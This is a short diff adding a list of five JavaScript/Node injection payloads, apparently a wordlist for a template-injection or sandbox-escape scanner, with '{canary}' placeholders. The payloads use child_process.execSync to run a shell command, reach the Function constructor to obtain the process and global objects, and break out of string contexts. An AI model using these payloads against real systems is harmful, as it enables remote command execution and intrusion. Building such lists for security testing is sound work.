@@ -1,0 +1,5 @@
+${global.process.mainModule.require('child_process').execSync('id')}
+}});console.log("{canary}");//
+constructor.constructor('alert("{canary}")')()
+this.constructor.constructor("return global")().process
+Object.constructor("return process")()
